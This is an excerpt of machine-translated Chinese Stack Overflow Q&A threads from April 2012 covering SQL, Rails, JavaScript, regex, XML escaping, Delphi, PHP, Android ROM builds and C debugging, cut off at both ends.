    @IsExistsItem int,
    @IsExistsWH int,
    @IsExistsExpiryDate int,
    @IsGR_HDR_ID int,
    @GR_HDR_ID int

    set @ItemID=1
    set @WareHouseID=2
    set @Qty=20
    set @StockType='R'
    set @GR_HDR_ID=2
    set @ExpiryDate = '4/4/2012 12:00:00 AM'

    set @IsExistsItem = (select count(ItemID) from TB_Stock_Details where    
    ItemID=@ItemID)   
    set @IsExistsWH = (select count(WareHouseID) from TB_Stock_Details where   
    WareHouseID=@WareHouseID)
    set @IsExistsExpiryDate = (select count(ExpiryDate) from TB_Stock_Details where  
    ExpiryDate=@ExpiryDate)

if(@StockType='R')
    begin
        IF (@IsExistsItem>0) and (@IsExistsWH>0) and (@IsExistsExpiryDate>0)
            BEGIN
                  UPDATE TB_Stock_Details
                   SET
                      Qty =Qty + @Qty
                   WHERE ItemID = @ItemID and GR_HDR_ID = @GR_HDR_ID 
            END
        ELSE
            begin
                INSERT INTO TB_Stock_Details(ItemID,WareHouseID,Qty,StockType,ExpiryDate)
                VALUES(@ItemID,@WareHouseID,@Qty,@StockType,@ExpiryDate)    
            end         
    end 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-13T22:07:46.507

首先在 UPDATE 之后你有两个 end 语句，一个就足够了。

数量没有增加的原因是因为插入到库存明细表时，没有设置GR_HDR_ID列的值。在您的更新命令中，您在 GR_HDR_ID 上设置了一个过滤器，但条件永远不会满足，因为它在您的表中没有任何值。

**编辑：**

对于您描述的场景，您需要旧值和新值作为参数，并且基于这些您也可以更新库存表。没有这些，您将无法知道应该更改什么，您只会得到一堆新数据。

一个更好的替代方法是在 TB_GoodsReceive_DTL 表上创建一个更新触发器，您可以在其中访问旧的新值（插入和删除的表），并可以更新 Stock 表中的相关记录。

# javascript - Rails 3.2.2 不执行 rjs

> ID：10148134
> 
> 赞同：9
> 
> 时间：2012-04-13T20:50:07.773
> 
> 标签：javascript, ruby-on-rails, ruby, ajax, rjs

我正在关注*Pragmatic Agile Web Development With Rails 4th Edition*这本书，但我使用的是 Rails 3.2.2 而不是书中推荐的 3.0.5：

```
~$ ruby -v
ruby 1.9.3p125 (2012-02-16) [i686-linux]
~$ rails -v
Rails 3.2.2 
```

我在包含 AJAX 以重绘购物车而不重新加载页面时遇到了问题。这是 line_items_controller.rb 中的创建操作：

```
def create
    @cart = current_cart
    product = Product.find(params[:product_id])
    @line_item = @cart.add_product(product.id)

    respond_to do |format|
      if @line_item.save
        format.html { redirect_to(store_url) }
        format.js 
        format.json { render json: @line_item, status: :created, location: @line_item }
      else
        format.html { render action: "new" }
        format.json { render json: @line_item.errors, status: :unprocessable_entity }
      end
    end
  end 
```

这是我的 RJS 文件 create.js.rjs（在 app/views/line_items 下）：

```
page.alert('NO PROBLEM HERE')
page.replace_html('cart', render(@cart)) 
```

但是，当我单击启动此操作的按钮时：

```
<%= button_to 'Add to Cart', line_items_path(:product_id => product), :remote => true %> 
```

我在开发日志中收到以下错误：

```
ActionView::MissingTemplate (Missing template line_items/create, application/create with {:locale=>[:en], :formats=>[:js, :html], :handlers=>[:erb, :builder, :coffee]}. Searched in:
  * "/home/me/src_rails/depot/app/views"
):
  app/controllers/line_items_controller.rb:47:in `create' 
```

如果我将 create.js.rjs 的文件名更改为 create.js.erb，则问题得到纠正：

```
Rendered line_items/create.js.erb (0.4ms) 
```

但视图中什么也没有发生……甚至警报也没有。我错过了什么？file.js.erb 和 file.js.rjs 有什么区别？

* * *

## 回答 #1

> 赞同：18
> 
> 时间：2012-04-14T12:59:45.793

从Rails 3.1开始，它似乎`rjs`已被[删除为默认设置。](http://weblog.rubyonrails.org/2011/4/21/jquery-new-default/)你可以通过安装 gem 来取回它`prototype-rails`，但我认为你应该只使用 jQuery，这是新的默认值。

至于您的代码，它不起作用的原因是它是一个`rjs`被解释为的模板`.js.erb`，这可能只是产生了无效的 JavaScript（您应该在浏览器的 JavaScript 控制台中看到错误）。用于为您设置变量的`rjs`模板`page`，您将使用它编写 Ruby 代码来操作您的页面。在`.js.erb`模板中，它更像在您的`.html.erb`视图中工作。您编写实际的 JavaScript，并使用`<% %>`标签嵌入 Ruby。所以里面的代码`create.js.erb`应该是这样的：

```
 alert('NO PROBLEM HERE');
 $('#cart').html("<%= escape_javascript(render(@cart)) %>"); 
```

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2012-04-13T20:59:46.893

在 rails >= 3.1 中不再有 jquery-rjs。但是你可以在这里使用 CoffeeScript: `line_items/create.js.coffee`:

```
alert 'NO PROBLEM HERE'
$('#cart').html '<%= j render(@cart) %>' 
```

或类似的东西。

# javascript - div隐藏视频停止

> ID：10148140
> 
> 赞同：1
> 
> 时间：2012-04-13T20:50:30.410
> 
> 标签：javascript, video, html, hide

我知道以前已经解决了这个问题，但是我对代码的了解还不够，无法将其他解决方案应用于我自己的问题，因为我的代码不同。我的视频不是 Youtube 视频，它只是在我的网络文件夹中。

基本上我的视频在自动播放的 div 中弹出。当您单击我想要的 vid 隐藏时，但音频继续播放。我只想在隐藏 div 时停止播放视频，而且我似乎无法弄清楚如何插入正确的代码。如果有人可以帮助我，我将不胜感激。谢谢。这是我的脚本：

```
<script type="text/javascript"> 
document.onclick=check; 
function check(e){ 
var target = (e && e.target) || (event && event.srcElement); 
var obj = document.getElementById('mydiv'); 
if(target!=obj){obj.style.display='none'} 
} 
</script>

 <div id="mydiv"><video autoplay><source src="socialphobiavideo.mp4"></video></div> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-13T21:07:01.670

添加一个[`id`](http://www.w3.org/TR/html5/global-attributes.html#the-id-attribute)到你的[`<video>`](http://www.w3.org/TR/html5/the-video-element.html#the-video-element)并使用[`pause()`](http://www.w3.org/TR/html5/media-elements.html#dom-media-pause)来停止它：

```
<script type="text/javascript"> 
document.onclick = function check(e){ 
    var target = (e && e.target) || (event && event.srcElement); 
    var obj = document.getElementById('mydiv'); 
    if(target != obj){
        obj.style.display='none';
        document.getElementById('myvideoelement').pause();
    } 
} 
</script>

<div id="mydiv">
    <video id='myvideoelement' autoplay>
        <source src="socialphobiavideo.mp4">
    </video>
</div> 
```

# javascript - Firefox 中的 Javascript 拖放

> ID：10148141
> 
> 赞同：1
> 
> 时间：2012-04-13T20:50:38.690
> 
> 标签：javascript, firefox, drag-and-drop

我为网站实现了拖放功能。Chrome 可以正常工作，IE9 也可以（不知何故），但 Firefox 以某种方式拒绝接受我的代码。

我可以单击可拖动对象，Firefox 会触发 ondragstart 事件，但不会继续。可拖动的对象没有出现，并且没有任何东西跟随我的鼠标移动。如果我再次点击它，同样的事情会发生，所以 Javscript 不会被杀死。

这是我的代码：

```
 self.allDraggables.on({
            dragstart:self.startDragging,
            dragend:self.stopDragging
        });

self.allDroppables.on({
            dragenter:self.enterDroppable,
            dragover:self.overDroppable,
            dragleave:self.leaveDroppable,
            drop:self.dropped
        });

this.startDragging = function () {
        $('div.insidePopup span.close').trigger('click');
        self.createWidget(this);
        self.allDroppables.animate({opacity:self.options.light},    self.options.animation);
    };

    this.stopDragging = function () {
        self.destroyWidget();
        self.allDroppables.animate({opacity:self.options.unlight}, self.options.animation);
    };

this.enterDroppable = function (event) {
    event.preventDefault();
    $(this).animate({opacity:1}, self.options.animation);
};

this.overDroppable = function (event) {
    event.preventDefault();
};

this.leaveDroppable = function () {
    $(this).animate({opacity:self.options.light}, self.options.animation);
}; 
```

self 指的是主要的 this 指针，因为在 Chrome 和 IE9 中一切正常，它不可能是语法中的东西，可以吗？

这确实是个问题，我周一收到了一份演示文稿，需要解决这个问题。

任何帮助将非常感激！

编辑：我正在使用 Firefox 11。

# java - 匹配可选值的正则表达式

> ID：10148143
> 
> 赞同：0
> 
> 时间：2012-04-13T20:50:46.633
> 
> 标签：java, regex

我正在尝试从 Web 服务器日志中提取一些信息，但它不是很结构化，所以我遇到了麻烦，我正在尝试匹配：

示例 1：

```
2011-11-29 11:30:23,685 DEBUG [my.fully.qualified.package.Service] Added Action Item: M= 2  Success 
```

示例 2：

```
2011-11-29 11:30:23,685 DEBUG [my.fully.qualified.package.Service] Added Action Item: M=10  Success 
```

此正则表达式适用于示例 1：

```
(\d\d\d\d-\d\d-\d\d)\s[\d|:]+,\d+\s([A-Z]+)\s\[(.+)\]\s.+:\sM=\s(\d).+ 
```

其中第一组是日期，第二组是日志级别，第三组是类名，第三组是 的值`M`。

您可能已经注意到，在示例 1 中，在 M= 之后，数字之前有一个空格，而在另一个示例中，这不是这个正则表达式不起作用的原因。

我确实尝试过类似的`M=[\s|d]+`方法，但是我得到了更多我要求的匹配字符，有人建议如何将这两个示例与一个正则表达式匹配吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-13T20:53:45.770

您希望`M=\s*(\d+)`在 之后立即允许零个或多个空格`=`，但在数字之后不允许任何空格。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-13T20:55:00.157

```
M=\s?(\d).+ 
```

允许在`=`.

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-13T20:56:38.910

我相信你有一些拼写错误，应该是

`M=[\s|\d]+`

# xml - 需要找到无效的xml部分

> ID：10148145
> 
> 赞同：1
> 
> 时间：2012-04-13T20:51:02.157
> 
> 标签：xml

打开 xml 时出现错误，只是非常不清楚。

> 它指向 857:564，不管它是什么（XMLEditor）。无效的 XML 字符 (Unicode 0x12)

我只是找不到 unicode 0x12 是什么。

似乎amperstand有问题，atm我有这个：

```
<to>
  <person email="w@bewitched.com" name="M & L Wattenberg"/>
</to> 
```

这会更好吗？

```
<to>
  <person email="w@bewitched.com">M & L Wattenberg</person>
</to> 
```

还是没有帮助？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-13T20:54:28.287

它不会有帮助。`&`是 XML 中的一个特殊字符，应该替换为`&amp;`它是在属性中还是在文本节点中都没有关系。

[请参阅此处](http://www.w3.org/TR/2004/REC-xml11-20040204/#dt-chardata)的字符数据定义。（注意关于属性中撇号和双引号的规则，这是处理 XML 数据的另一个典型陷阱。）

尽管您没有指定用于生成 XML 的编程语言，但在几乎每个 XML 处理库中，通常都有一种方法可以进行所有必要的转义，而无需手动进行。

# database - 取消记录更改

> ID：10148147
> 
> 赞同：1
> 
> 时间：2012-04-13T20:51:23.123
> 
> 标签：database, delphi, paradox

我正在使用 dbedit 组件编辑记录，我有一个取消按钮，但我不确定如何制作它，因此使用 dbedit 组件所做的所有更改都将被还原。

我正在考虑将记录复制到临时表或在同一个表中复制记录，如果保存更改，我可以删除旧记录，或者如果输入被取消，则删除复制的记录（保留原始记录）。

我只是想知道在不创建无用表、创建太多程序的情况下处理此问题的最佳方法。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-13T21:01:00.513

如果我没记错的话，对悖论表的更改只会在`post`命令之后写入数据库。如果您想取消更改，只需执行

```
TForm1.CancelButtonPresss(Sender: TObject);
begin
  ParadoxTable.Cancel;
end;

TForm1.OKButtonPress(Sender: TObject);
begin
  ParadoxTable.Post;
end; 
```

顺便说一句，自从我使用悖论表以来已经很长时间了，所以我的回忆是不正确的，如果我弄错了，请随时投票否决这个答案。
我在mac上输入这个，所以我现在不能检查它。

稍后我会看看我是否可以为您提供更明智的答案。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-04-13T21:09:06.423

为了称赞 Johan 的回答（使用`TDataSet.Cancel`），如果您使用 a `TCustomClientDataSet`，您也可以使用该`RevertRecord`方法删除对当前记录的修改，前提是它们仍在更改日志中。

您还可以设置快照`SavePoint`并恢复到该状态，同时取消所有修改。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-04-13T21:45:48.403

约翰的回答很适合单曲。如果您正在使用 SQL 数据库（Oracle、MSSql、MySql、Firebird 等），还有一种可用于多条记录的附加方法：事务。以 ADO 为例

```
 TForm1 = class(TForm)
    ADOConnection: TADOConnection;
…

  // start the transaction
  ADOConnection.BeginTrans;
…

  // create records and post them
…

  // rollback removes the records posted
  // since the transaction was started
  ADOConnection.RollbackTrans;
… or …
  // commit completes saving the records posted
  // since the transaction was started
  ADOConnection.CommitTrans; 
```

如果您没有显式启动事务，则会在记录发布到数据库时自动启动并提交一个事务。

François 的回答类似于事务，但仅适用于 ClientDatasets。

# php - 从 php 脚本执行彩色命令

> ID：10148151
> 
> 赞同：13
> 
> 时间：2012-04-13T20:51:28.850
> 
> 标签：php, colors, command, command-line-interface

我有一个命令，例如“git diff”，当我从终端运行它时会输出彩色结果。

现在，我想从 CLI php 脚本调用该命令并在控制台中显示彩色结果。我尝试使用 exec()、system()、passthru()，但在所有情况下，输出都已转换为纯黑白文本。

有没有办法保留标准结果的颜色？如果没有，有人知道为什么这些信息会丢失吗？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-04-15T05:39:07.993

您正在运行的命令很可能正在检查输出是否到终端，如果不是，则不对其进行着色。通常有一种方法可以强制它，但这将特定于命令本身；在 的情况下`git diff`，您可以指定`--color=always`。

# javascript - 用于创建小部分网页和用数据值替换占位符的单独 HTML 文件的占位符表示法

> ID：10148160
> 
> 赞同：0
> 
> 时间：2012-04-13T20:52:37.133
> 
> 标签：javascript, html, string, dom

目前我正在使用诸如“rusername”“rpassword”或“rdate”之类的文本，然后使用适当的字符串替换函数进行替换，例如

```
htmlstring=htmlstring.replace(/rusername/g,object.username); 
```

当项目规模扩大时，这是一个令人困惑的符号。对于像 rreply rratio 等世界，当我使用 :username html 编辑器时会给出我不想看到的错误，因为编辑器认为我会直接使用 html 而不是替换它。我应该使用什么样的符号来替换文本？对于 html 设计者来说，它看起来应该是合法的，{username} 不好，它有通用格式吗？你有什么建议？

可能有很多有效的方法，所以请不要犹豫以任何方式回答。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-13T20:59:31.263

我建议完全不要进行字符串替换，而是使用带 ID 的跨度。它也会快得多。

```
<div>
    Hello, <span id="username"><span>!
</div> 
```

然后你的脚本看起来像：

```
document.getElementById("username").innerHTML = object.username; 
```

# asp.net - 更新到 ASP.NET 4 后，IE 中的会话“立即过期”？（FF 工作正常）

> ID：10148161
> 
> 赞同：4
> 
> 时间：2012-04-13T20:52:37.867
> 
> 标签：asp.net, session, cookies, .net-4.0

我将 .net 2.0 应用程序升级到 net 4.0，现在如果我尝试使用 IE 登录，会话会立即过期。

有人对在哪里寻找这个问题有任何想法吗？

Firefox 可以正常登录。

谢谢。

编辑，更多信息：检查 IE 的 cookie 和 firefox 的 cookie，似乎没有在 IE 中创建 cookie，而是在 firefox 中创建。关于为什么会这样的任何想法？还在摸索，但是有点难……

最后编辑；已修复：原来这与 asp 4.0 无关。我升级了应用程序并将其设置在子域上进行测试，以确保一切正常，并且子域中有一个 _。经过大量研究，IE 不会从带有 _ 的域中获取 cookie。显然，这是有意设计的，因为从技术上讲，DNS 规则禁止在域中使用下划线。更改为 - 并且可以正常工作。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-23T20:27:26.060

最后编辑；已修复：原来这与 asp 4.0 无关。我升级了应用程序并将其设置在子域上进行测试，以确保一切正常，并且子域中有一个 _。经过大量研究，IE 不会从带有 _ 的域中获取 cookie。显然，这是有意设计的，因为从技术上讲，DNS 规则禁止在域中使用下划线。更改为 - 并且可以正常工作。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-23T07:37:52.340

如果您的应用程序在 Firefox 上运行良好，那么可能是因为 IE 8。IE 8 对 cookie 处理有不同的设置。这是解决该问题的方法：-

1) 工具 -> Internet 选项 -> 隐私 -> 高级 -> 选中覆盖自动 cookie 处理。2) 在第一方 Cookie 中选择接受并选择接受第三方 cookie 3) 选中始终允许会话 cookie

如果您无法更改客户端浏览器上的设置，请尝试无 cookie 会话。为此，只需定义：-

```
<sessionState cookieless="true" /> 
```

在您的网络配置文件中。

有关无 cookie 会话的详细信息：-

[http://msdn.microsoft.com/en-us/library/aa479314.aspx](http://msdn.microsoft.com/en-us/library/aa479314.aspx)

# html - 偏移表格单元格

> ID：10148164
> 
> 赞同：0
> 
> 时间：2012-04-13T20:52:55.587
> 
> 标签：html, css, alignment

我有一个 4x4 的单选按钮表。在第一行（4x4 上方的额外行）我想要一个水平居中的按钮。我已经尝试过 colspan 等，但仍然像其他人一样将单选按钮留在列中，因此未居中。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-13T21:01:01.170

强制性无表答案：

```
<div>
    <div class="center"><input type='button' value='hello' /></div>
    <ul class="radioList">
        <li>
            <label for="radio1">
                <input type="radio" id="radio1" />
                Checkbox 1</label>
        </li>
        <li>
            <label for="radio2">
                <input type="radio" id="radio2" />
                Checkbox 2</label>
        </li>
        <li>
            <label for="radio3">
                <input type="radio" id="radio3" />
                Checkbox 3</label>
        </li>
        <li>
            <label for="radio4">
                <input type="radio" id="radio4" />
                Checkbox 4</label>
        </li>
    </ul>   
</div>

.center { text-align:center; }
.radioList {
    list-style:none;
    width:100%;
}
.radioList li {
    float:left;
    width:25%;
} 
```

[http://jsfiddle.net/Amudt/](http://jsfiddle.net/Amudt/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-13T20:57:24.320

[http://jsfiddle.net/EJbny/](http://jsfiddle.net/EJbny/)

```
<table style='width:100%;' border=1>
<tr>
    <td colspan=4 style='text-align:center;'><input type='button' value='hello'></td> 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-13T20:59:26.083

像这样？只需使用 CSS 和`text-align:center`第一行的规则。这是一个**[jsFiddle 示例](http://jsfiddle.net/j08691/PF77G/)**。

```
<table>
    <tr>
        <td colspan="4" style="text-align:center"><input type="radio" /></td>
    </tr>
    <tr>
        <td><input type="radio" /></td>
        <td><input type="radio" /></td>
        <td><input type="radio" /></td>
        <td><input type="radio" /></td>
    </tr>
    <tr>
        <td><input type="radio" /></td>
        <td><input type="radio" /></td>
        <td><input type="radio" /></td>
        <td><input type="radio" /></td>
    </tr>
    <tr>
        <td><input type="radio" /></td>
        <td><input type="radio" /></td>
        <td><input type="radio" /></td>
        <td><input type="radio" /></td>
    </tr>
    <tr>
        <td><input type="radio" /></td>
        <td><input type="radio" /></td>
        <td><input type="radio" /></td>
        <td><input type="radio" /></td>
    </tr>
</table> 
```

# objective-c - 检测最后一行并添加一个

> ID：10148166
> 
> 赞同：0
> 
> 时间：2012-04-13T20:53:02.303
> 
> 标签：objective-c, xcode, ios5

在我的应用程序中，我显示项目。我的`JSON`提要包含 50 个项目，但首先我想显示 25 个，当用户向下滚动到最后一行时，它需要加载更多项目。

我正在做：

下载`JSON`提要；

```
NSString *jsonString = [NSString 
                        stringWithContentsOfURL:[NSURL URLWithString:xmlDataUrl] 
                        encoding:NSStringEncodingConversionAllowLossy
                        error:nil];
SBJSON *parser = [[SBJSON alloc] init];
NSDictionary *results = [parser objectWithString:jsonString error:nil];
parser = nil;
[self setTableData:[results objectForKey:@"feed"]]; 
```

//

```
- (NSInteger)numberOfSectionsInTableView:(UITableView *)tableView
{
    // Return the number of sections.
    return 1;
} 
```

//

```
 - (NSInteger)tableView:(UITableView *)tableView numberOfRowsInSection:(NSInteger)section
    {
        // Return the number of rows in the section.
        //return [tableData count];
        return 25;
    } 
```

并检测最后一行：

```
 if(indexPath.row == [self.tableData count] - 1) 
    {

        NSLog(@"Last Row");
    } 
```

但它没有检测到最后一行。这是因为它正在下载的 JSON 包含超过 25 行吗？

我如何添加新行是`[self.tableDate count] +1;`可能的？

如果我确实返回`[tableData count];`它正在检测最后一行，但这些行已经填充了 100%，我需要显示 25/50 而不是 +1

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-13T20:58:51.260

你在哪里调用第二个代码块？它在您的表委托的 willDisplayCell: 方法中吗？

在我的一个项目中，我有非常相似的代码

```
- (void)tableView:(UITableView *)tableView willDisplayCell:(UITableViewCell *)cell forRowAtIndexPath:(NSIndexPath *)indexPath
{
    if (indexPath.row == self.search.count && [tableView.indexPathsForVisibleRows containsObject:indexPath])
    {
        [self.search findMoreStuff];
    }
} 
```

在为 self.search 创建的行之后附加了一个额外的行，所以在我的情况下，我正在检查 self.search.count，但您可能想查看 self.search.count-1

# java - 将 Struts2 表单保存到数据库

> ID：10148169
> 
> 赞同：0
> 
> 时间：2012-04-13T20:53:08.873
> 
> 标签：java, hibernate, struts2

我正在制作一个小型应用程序来自学 Struts2 以及如何使用 JSP。

我有一个带有 JSP 页面的 Struts2 应用程序，上面有一个 struts 表单。我想知道将输入数据从表单提交到我已经创建的数据库表的最简单方法是什么。

谁能给我一个例子或让我开始？

谢谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-13T21:28:58.977

这是一个非常普遍的问题 - 有很多方法可以将对象保存到数据库。最流行的一种是使用像 Hibernate 这样的 ORM 框架（我在您的标签中看到）。其他方法可以通过将对象转换为 INSERT 语句来使用直接 JDBC。

由于您将 hibernate 放入标签中，因此您可以遵循以下简单示例：[http ://www.javaworld.com/javaworld/jw-10-2004/jw-1018-hibernate.html](http://www.javaworld.com/javaworld/jw-10-2004/jw-1018-hibernate.html)

步骤是 - 设置 SessionFactory - 为您的对象创建映射 - 使用 SessionFactory 获取会话，使用会话 - 您可以保存、更新等

只是为了将来参考，人们倾向于对“教我怎么做”类型的帖子皱眉。祝你好运。

# android - 使Android Source中的应用程序编译为系统/应用程序而不是数据/应用程序？

> ID：10148171
> 
> 赞同：7
> 
> 时间：2012-04-13T20:53:14.750
> 
> 标签：android, android-source, rom

我正在从源代码编译 Android ROM，并且我有几个可以编译的应用程序，但可以编译到手机上的数据/应用程序中。它们可以通过手机设置卸载。我希望它们无法从手机上卸载，并编译成系统/应用程序而不是数据/应用程序。

有什么建议吗？

编辑：错字

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-29T13:17:06.887

添加：

```
LOCAL_MODULE_PATH := system/app
LOCAL_UNINSTALLABLE_MODULE := true
LOCAL_CERTIFICATE := platform 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-04-20T09:08:03.710

这是您可以使用的 mk 文件的示例。在我的情况下，应用程序然后构建到`system/app`：

```
LOCAL_PATH:= $(call my-dir)
include $(CLEAR_VARS)

LOCAL_MODULE_TAGS := optional

LOCAL_SRC_FILES := $(call all-java-files-under, src)

LOCAL_PACKAGE_NAME := package_name
LOCAL_CERTIFICATE := platform

include $(BUILD_PACKAGE)

# Use the folloing include to make our test app
include $(call all-makefiles-under,$(LOCAL_PATH)) 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2014-02-15T01:31:20.303

使用 cm_10.2，我将我的应用程序添加到 packages/apps 中，默认情况下，mm 将其构建到 /data/app 中。我希望它进入系统/应用程序。它通过将其添加到 Android.mk 中来工作：

```
LOCAL_MODULE_PATH := $(TARGET_OUT_APPS) 
```

但我不确定这是否是一种干净的方式，因为我几乎发现没有人这样做。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2017-01-29T17:13:50.677

```
LOCAL_PATH:= $(call my-dir)

include $(CLEAR_VARS)

LOCAL_MODULE_TAGS := optional
LOCAL_UNINSTALLABLE_MODULE := true
LOCAL_MODULE_PATH := $(TARGET_OUT_APPS)
LOCAL_CERTIFICATE := platform

LOCAL_SRC_FILES := $(call all-java-files-under, src)

LOCAL_PACKAGE_NAME := MyTestApp

LOCAL_PROGUARD_ENABLED := disabled
LOCAL_PRIVILEGED_MODULE := true

LOCAL_STATIC_JAVA_LIBRARIES := libarity android-support-v4

include $(BUILD_PACKAGE)

include $(call all-makefiles-under,$(LOCAL_PATH)) 
```

# c - free() 处的分段错误

> ID：10148175
> 
> 赞同：0
> 
> 时间：2012-04-13T20:53:40.347
> 
> 标签：c, linked-list, segmentation-fault, nodes

当我在以下链表实现的删除函数中执行 free() 时，我遇到了分段错误。请看一下并告诉我哪里出错了。当我用 valgrind 运行这个程序时，没有 seg。故障，运行正常。所以我无法找出问题所在。

```
typedef struct node {
    char name[100];
    int id;
    struct node* next;
} Node;

void insert(Node** p, char* _name, int _id)
{
    Node *temp, *prev;
    temp = malloc(sizeof(struct node));
    temp->next = NULL;
    strcpy(temp->name,_name);
    temp->id = _id;

    if(*p == NULL) {
            *p = temp;
    }
    else {
            for(prev = *p; prev->next!=NULL; prev=prev->next);
            prev->next=temp;
    }
}

/* Delete entry
  @params p    first element
       _id     ID to delete
*/
void delete_by_id(Node** p, int _id) {
    Node *temp, *prev;
    prev = NULL;
    for(temp = *p; temp!= NULL; prev = temp, temp=temp->next) {
            if(temp->id == _id) {
                printf("Deleting entry with id: %d\n", temp->id);
                if(prev == NULL)
                     *p = temp->next;
                else
                     prev->next= temp->next;
                free(temp);
                return;
            }
    }     
} 
```

以下是主程序的部分代码：

```
Node* p;  
int main() {
      ...
      ...
      buf[rval]=0;
      char* tokens = strtok(buf, "+");
      char* strArray[5]; /* up-to 5 words can be stored */
      int n = 0;
      while (tokens)
      {
        strArray[n] = malloc(strlen(tokens) + 1);
        strcpy(strArray[n++], tokens);
        tokens = strtok(NULL, "+");
      }
      int type = 0;
      if(strcmp(strArray[0], "1") == 0)
            type = 1;
      else
            type = 2;
      char* name = "";  
      if(type == 1) {
            name = strArray[1];
            insert(&p, name, clients[i]);
            display(&p);
      } else {
            name = strArray[1];
            rval = search(&p, name);
            if(rval) { 
                delete_by_id(&p, rval);
                display(&p);
            }
      }

      for (i = 0; i < 5; i++)
      {
        if (strArray[i]) // check for null data 
            free(strArray[i]);
      }
      ...
      ...
}

int search(Node** p, char* _name) {
    Node *temp;
    for (temp = *p; temp!= NULL; temp = temp->next) {
            if (strcmp((char *)temp->name, _name)==0) {
                    printf("Name matched: %s\n", temp->name);
                    return temp->id;
            }
    }
    return 0;
} 
```

Valgrind 抱怨用于 strArray 而不是链表的 malloc 和 free 。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-04-13T21:29:05.790

打印出返回的地址`malloc()`，并打印出`temp`调用之前的值`free()`。确保传递的`free()`内容符合您的预期。如果您以某种方式传递了一个`free()`不是来自的指针`malloc()`，您可能会遇到您所看到的问题。

该函数也有可能`delete_by_id()`使用了无效的指针。该`p`参数在检查之前被取消引用`NULL`。我建议在调试器中遍历该函数，并确保所有指针看起来都符合您的预期。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-04-13T23:08:14.107

让您的程序转储内核并分析 GDB 中的内核：

```
gdb -c yourprog.core yourprog 
```

然后做一个完整的回溯：

```
(gdb) bt full 
```

这将向您显示段错误的确切原因以及传递给函数的值。

（编辑）哦，用 GCC`-g`开关编译你的程序以获得调试信息。

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-04-13T21:22:58.147

通过 valgrind 运行你的程序。空闲段错误通常是由于在分配的内存之外写入（这会覆盖/破坏系统在分配的内存之前/之后放置的包装器）。Valgrind 通常是找出相关写入发生时间的最简单方法。

# javascript - 将 Javascript 函数转换为 jQuery 插件

> ID：10148176
> 
> 赞同：2
> 
> 时间：2012-04-13T20:53:41.297
> 
> 标签：javascript, jquery

我已经有这样的速记功能：

```
function myObj() {};
    myObj.prototype.read = function (name) {alert(name);};
    ...(more functions) 
```

现在我想把它“转换”成一个 jQuery 插件。
最好的方法是什么？（我的函数之前不需要选择器）。我想过这样做：

```
$.myObj.methodHere(); 
```

提前致谢。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-13T20:57:43.320

只需将您的方法添加到 jQuery 对象。

```
$.myObj = myObj; 
```

然后你可以这样称呼它：

```
$.myObj.methodHere(); 
```

编辑：你为什么要这样做？jQuery 插件应该作用于 jQuery 对象。您的函数“之前不需要选择器”，因此它不是真正的“插件”。

# php - PHP：检查字符串是否包含软连字符并替换它

> ID：10148184
> 
> 赞同：2
> 
> 时间：2012-04-13T20:54:10.390
> 
> 标签：php, replace

我需要检查一个字符串是否包含软连字符以及是否将其从字符串中删除。关于在将字符串保存到数据库之前找到并删除它的最佳方法有什么建议吗？

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2012-04-13T21:03:02.857

软连字符在这里是不可见的，但这会删除它：

```
$str = str_replace('­', '', $str); 
```

* * *

## 回答 #2

> 赞同：6
> 
> 时间：2012-04-13T21:04:13.890

您链接的软连字符（如果您的字符串是 ISO 8859-1）：

```
$str = strtr($str, array("\xAD" => "")); 
```

否则，您需要在您使用的编码中找到它的字节序列，为常见字符集的[SOFT HYPHEN (U+00AD)给出了一些值：](http://en.wikipedia.org/wiki/Soft_hyphen)

```
 \xAD      ISO-8859-1; ISO-8859-2; ISO-8859-3; ISO-8859-4; ISO-8859-5; 
           ISO-8859-6; ISO-8859-8; ISO-8859-9; ISO-8859-15; Windows 1250; 
           Windows 1251; Windows 1252; Windows 1253; Windows 1254; Windows 
           1255; Windows 1256; Windows 1257; Windows 1258

 \xF0      OEM 775; OEM 850; OEM 852; OEM 855; OEM 857; OEM 858;

 \xC2\xAD  UTF-8 
```

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2012-04-13T20:55:14.103

**试试这个 ：**

```
$str = str_replace('-','',$str); 
```

* * *

## 回答 #4

> 赞同：4
> 
> 时间：2016-04-27T06:10:01.347

这里没有一个答案对我有用。我能够删除软连字符的唯一方法是：

```
preg_replace('~\x{00AD}~u', '', $str); 
```

# vba - 哪些 VB 或 VBA 解释器或编译器可用于 Windows 操作系统？

> ID：10148185
> 
> 赞同：2
> 
> 时间：2012-04-13T20:54:15.050
> 
> 标签：vba, vb6

我正在寻找 Visual Basic 或 VBA 的解释器（编译器也可以）。我不是在寻找任何类型的 UI 支持。基本上，我有一系列有点复杂的 VBA 模块，它们不引用任何外部 DLL，也不使用任何用户界面。如果没有适用于 Windows 操作系统的 Microsoft Office 或 Microsoft Visual Basic，是否有任何此类工具可用？

* * *

## 回答 #1

> 赞同：7
> 
